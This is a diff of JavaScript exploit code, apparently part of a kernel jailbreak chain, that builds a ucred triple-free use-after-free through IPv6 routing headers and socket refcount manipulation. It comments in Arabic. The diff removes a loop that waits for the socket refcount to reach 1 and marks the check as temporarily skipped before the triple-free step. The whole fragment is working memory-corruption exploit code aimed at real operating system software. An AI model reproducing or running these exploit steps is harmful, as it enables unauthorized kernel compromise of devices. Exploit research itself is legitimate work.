@@ -1426,34 +1426,9 @@ function trigger_ucred_triplefree() {
     free_rthdr(ipv6_socks[twins[0]]);
     send_notification("step 9: done");
 
-    // 10) انتظار refcount = 1 لنفس السوكت
-    var count = 0;
-    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-
-      trigger_iov_recvmsg();
-
-      write(new BigInt(iov_sock_1), tmp, 1);
-      wait_iov_recvmsg();
-      read(new BigInt(iov_sock_0), tmp, 1);
-
-      write32(leak_rthdr.add(0x04), 0);
-      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
-      var refc = read32(leak_rthdr);
-
-      if (refc === 1) break;
-      count++;
-    }
-
-    if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      twins[0] = -1;
-      twins[1] = -1;
-      close(new BigInt(uaf_socket));
-      end = false;
-      continue;
-    }
-
+    // 10) (مؤقتًا) نتخطى انتظار refcount
     triplets[0] = twins[0];
-    send_notification("step 10: done");
+    send_notification("step 10: skipped refcount check (temp)");
 
     // 11) triple free فعليًا على uaf_socket
     close(dup(new BigInt(uaf_socket)));
